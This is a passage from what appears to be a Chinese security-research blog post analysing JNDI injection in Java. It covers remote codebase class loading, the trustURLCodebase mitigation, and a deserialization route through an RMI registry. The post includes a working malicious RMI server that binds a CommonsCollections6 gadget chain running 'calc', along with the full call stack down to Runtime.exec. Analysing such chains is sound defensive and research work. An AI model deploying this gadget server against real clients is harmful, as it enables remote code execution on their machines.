<p><code>getVersionHelper</code> 函数返回的是一个 <code>VersionHelper12</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    helper = <span class="keyword">new</span> <span class="title class_">VersionHelper12</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> VersionHelper <span class="title function_">getVersionHelper</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> helper;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>VersionHelper</code> 和 <code>VersionHelper12</code> 属于 <strong>JNDI 内部工具类</strong>（包名通常是 <code>com.sun.naming.internal</code>），用于<strong>屏蔽不同 JDK 版本的差异</strong>，尤其是<strong>类加载</strong>相关（TCCL、URLClassLoader、codebase 解析等）。</p>
<p><code>VersionHelper12</code> 对象的 <code>loadClass</code> 方法实际上会通过 <code>URLClassLoader</code> 远程加载加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从指定 codebase（由空格分隔的一组 URL）中加载给定类名的类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className 非空，完全限定类名（FQCN）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase  非空，按空格分隔的多个 URL 字符串（目录以 / 结尾，或指向具体 .jar）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 找不到类时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> MalformedURLException  codebase 中存在非法 URL 时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 取当前线程的上下文类加载器（TCCL）作为父加载器</span></span><br><span class="line">    <span class="comment">//    在应用服务器/容器场景，TCCL 决定了资源可见性与委派链路。</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 基于 codebase 构造一个 URLClassLoader（父加载器为 TCCL）</span></span><br><span class="line">    <span class="comment">//    getUrlArray(codebase) 会把以空格分隔的 URL 串解析成 URL[]。</span></span><br><span class="line">    <span class="comment">//    目录 codebase 需以 &quot;/&quot; 结尾（方便拼接 .class 路径）；</span></span><br><span class="line">    <span class="comment">//    若是 JAR codebase，则应指向具体 .jar（也可用 jar:...!/ 形式）。</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 用上面创建的 URLClassLoader 去加载目标类（触发网络/文件系统查找）</span></span><br><span class="line">    <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 包可见的内部工具方法：使用给定的 ClassLoader 去加载类。</span></span><br><span class="line"><span class="comment"> * 该方法与 TCCL 配合使用，不对外暴露（避免错误使用破坏类加载语义）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className 非空，FQCN</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> cl        目标类加载器（可能是 URLClassLoader，也可能是 TCCL）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 找不到类时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Class&lt;?&gt; loadClass(String className, ClassLoader cl) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Class.forName(name, initialize=true, loader)</span></span><br><span class="line">    <span class="comment">//  - initialize=true：加载后立即执行类初始化（&lt;clinit&gt;）</span></span><br><span class="line">    <span class="comment">//  - loader：指定从哪个加载器的命名空间解析，遵循父委派</span></span><br><span class="line">    Class&lt;?&gt; cls = Class.forName(className, <span class="literal">true</span>, cl);</span><br><span class="line">    <span class="keyword">return</span> cls;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>JDK 8u121、7u131、6u141 开始增加了 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 选项，默认为 <code>false</code>，禁止 RMI 和 CORBA 协议使用远程 <code>codebase</code> 的选项。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 决定是否允许从任意 URL 的 codebase 加载类（针对 COSNaming 提供者）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> trustURLCodebase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 通过系统属性控制：是否允许从任意 URL codebase 加载类</span></span><br><span class="line">    <span class="comment">// 属性名：com.sun.jndi.cosnaming.object.trustURLCodebase</span></span><br><span class="line">    <span class="comment">// 默认值为 &quot;false&quot;</span></span><br><span class="line">    PrivilegedAction&lt;String&gt; act = () -&gt; System.getProperty(</span><br><span class="line">        <span class="string">&quot;com.sun.jndi.cosnaming.object.trustURLCodebase&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在特权块中读取系统属性（即使调用方受限，只要库自身有权限也能读取）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">trust</span> <span class="operator">=</span> AccessController.doPrivileged(act);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅当属性值等于 &quot;true&quot;（忽略大小写）时才开启</span></span><br><span class="line">    trustURLCodebase = <span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trust);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>新版本在 <code>decodeObject</code> 添加了 <code>trustURLCodebase</code> 判断：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果 r 是 RemoteReference（RMI 远程引用封装），先取出其内部真正的引用对象；</span></span><br><span class="line"><span class="comment">// 否则就把 r 当作普通对象用。</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (r <span class="keyword">instanceof</span> RemoteReference)</span><br><span class="line">            ? ((RemoteReference) r).getReference()</span><br><span class="line">            : (Object) r;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 只有当系统属性 com.sun.jndi.rmi.object.trustURLCodebase 被设置为 &quot;true&quot; 时，</span></span><br><span class="line"><span class="comment"> * 才允许从任意 URL codebase（工厂类位置）加载类。</span></span><br><span class="line"><span class="comment"> * —— 默认不信任远程 codebase（现代 JDK 的安全基线）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先把 obj 转成 Reference（延迟还原说明书）</span></span><br><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">    <span class="comment">// 直接就是 Reference：说明它描述了如何用 ObjectFactory 还原出目标对象</span></span><br><span class="line">    ref = (Reference) obj;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">    <span class="comment">// 如果对象实现了 Referenceable，则通过 getReference() 取到 Reference</span></span><br><span class="line">    <span class="comment">// （很多可绑定到 JNDI 的资源类型会这么实现）</span></span><br><span class="line">    ref = ((Referenceable) obj).getReference();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果存在 Reference，且其指定了 factoryLocation（通常是 URL），</span></span><br><span class="line"><span class="comment">// 但当前未开启 trustURLCodebase，则拒绝（抛出配置异常）</span></span><br><span class="line"><span class="comment">// —— 这一步拦截“从远程地址加载工厂类”的风险点。</span></span><br><span class="line"><span class="keyword">if</span> (ref != <span class="literal">null</span> &amp;&amp; ref.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">    !trustURLCodebase) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(</span><br><span class="line">        <span class="string">&quot;The object factory is untrusted. Set the system property&quot;</span> +</span><br><span class="line">        <span class="string">&quot; &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把对象（可能是原始对象，也可能是 Reference）交给 NamingManager 做最终还原：</span></span><br><span class="line"><span class="comment">// 1) 若是 Reference：按其工厂类及 RefAddr 参数调用 ObjectFactory 生成目标对象</span></span><br><span class="line"><span class="comment">// 2) 否则：尝试已注册的 ObjectFactory 处理，或直接返回对象本身</span></span><br><span class="line"><span class="keyword">return</span> NamingManager.getObjectInstance(obj, name, <span class="built_in">this</span>, environment);</span><br></pre></td></tr></table></figure></div>

<p>远程加载工厂类会有如下报错，因此 RMI 和 CORBA 在以上的 JDK 版本上已经无法触发该漏洞。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.</span><br><span class="line">    at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:495)</span><br><span class="line">    at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138)</span><br><span class="line">    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)</span><br><span class="line">    at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">    at org.example.Client.main(Client.java:10)</span><br></pre></td></tr></table></figure></div>

<h4 id="反序列化（无限制）"><a href="#反序列化（无限制）" class="headerlink" title="反序列化（无限制）"></a>反序列化（无限制）</h4><p>这个方法其实本质上就是 RMI 中反序列化攻击客户端的情况。</p>
<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 客户端侧 ──
    box rgb(230,242,255) 客户端（进程）
      participant App as Client 应用 💻
      participant IC as InitialContext
      participant GUC as GenericURLContext
      participant RC as RegistryContext
      participant RegStub as RegistryImpl_Stub（客户端存根）
    end

    %% ── 服务端侧（RMI 注册中心） ──
    box rgb(232,245,233) RMI 注册中心（服务端）
      participant Skel as RegistryImpl_Skel / Skeleton
      participant Impl as RegistryImpl（bindings）
    end

    %% 1) JNDI 解析到 RMI Registry
    App->>IC: lookup("rmi://localhost:1099/exploit") 🔍
    IC->>GUC: 解析 rmi: URL
    GUC->>RC: RegistryContext.lookup(Name)

    %% 2) 客户端发起 RMI 调用：RegistryImpl_Stub#lookup
    RC->>RegStub: registry.lookup("exploit")（JRMP）📤
    RegStub->>Skel: 远程调用 dispatch(op=lookup) 🌐
    Skel->>Skel: 读取入参 name="exploit"（ObjectInput）

    %% 3) 服务端查 bindings 并“原样序列化返回”
    Skel->>Impl: server.lookup("exploit")
    Impl->>Impl: obj = bindings.get("exploit")
    Impl-->>Skel: 返回 obj
    note right of Skel: 直接 writeObject(obj) 回传（无任何过滤）
    Skel-->>RegStub: 返回字节流（包含 obj 的序列化）📦

    %% 4) 客户端反序列化返回值 —— 触发利用点
    RegStub->>RegStub: ObjectInputStream.readObject() （恶意代码已执行）⚠️
    note right of RegStub: 💥 反序列化触发链（示例）：<br/>HashMap.readObject → TiedMapEntry.hashCode → LazyMap.get →<br/>ChainedTransformer → InvokerTransformer → Method.invoke → Runtime.exec</pre>

<p>将服务器端改成下面这种实现，即我们在注册中心添加的是反序列化对象，而不是 <code>ReferenceWrapper</code> 包裹的 <code>Reference</code> 类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;sky123&quot;</span>, CommonsCollections6.getObject(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, hashMap);</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>).rebind(<span class="string">&quot;exploit&quot;</span>, remoteObject);</span><br><span class="line">        Thread.currentThread().join();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">at java.lang.Runtime.exec(Runtime.java:320)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:126)</span><br><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:123)</span><br><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:158)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:74)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:121)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:340)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1419)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2322)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2213)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1669)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1418)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2322)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2213)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1669)</span><br><span class="line">at java.io.ObjectInputStream.access$800(ObjectInputStream.java:217)</span><br><span class="line">at java.io.ObjectInputStream$GetFieldImpl.readFields(ObjectInputStream.java:2603)</span><br><span class="line">at java.io.ObjectInputStream.readFields(ObjectInputStream.java:673)</span><br><span class="line">at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:429)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2322)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2213)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1669)</span><br><span class="line">at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2431)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2355)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2213)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1669)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)</span><br><span class="line">at sun.rmi.registry.RegistryImpl_Stub.lookup(RegistryImpl_Stub.java:127)</span><br><span class="line">at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:132)</span><br><span class="line">at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:218)</span><br><span class="line">at javax.naming.InitialContext.lookup(InitialContext.java:417)</span><br><span class="line">at org.example.Client.main(Client.java:11)</span><br></pre></td></tr></table></figure></div>

<p>前面提到过 <code>InitialContext</code> 的 <code>lookup</code> 方法会调用到 <code>RegistryContext#lookup</code> 方法，而在该方法中会调用的 <code>registry.lookup</code> 实际上是 <code>RegistryImpl_Stub#lookup</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(Name name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">RegistryContext</span>(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    Remote obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = registry.lookup(name.get(<span class="number">0</span>)); <span class="comment">// 👈 RegistryImpl_Stub#lookup</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (<span class="keyword">new</span> <span class="title class_">NameNotFoundException</span>(name.get(<span class="number">0</span>)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(e).fillInStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (decodeObject(obj, name.getPrefix(<span class="number">1</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>RegistryImpl_Stub#lookup</code> 会发起一次远程 RMI 调用查询远程对象，并将获取到的远程对象反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// implementation of lookup(String)</span></span><br><span class="line"><span class="keyword">public</span> java.rmi.Remote <span class="title function_">lookup</span><span class="params">(java.lang.String $param_String_1)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.AccessException, java.rmi.NotBoundException, java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> (StreamRemoteCall)ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_String_1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        ref.invoke(call);</span><br><span class="line">        java.rmi.Remote $result;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">            $result = (java.rmi.Remote) in.readObject(); <span class="comment">// 👈 反序列化</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException | IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            call.discardPendingRefs();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.rmi.RemoteException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.rmi.NotBoundException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

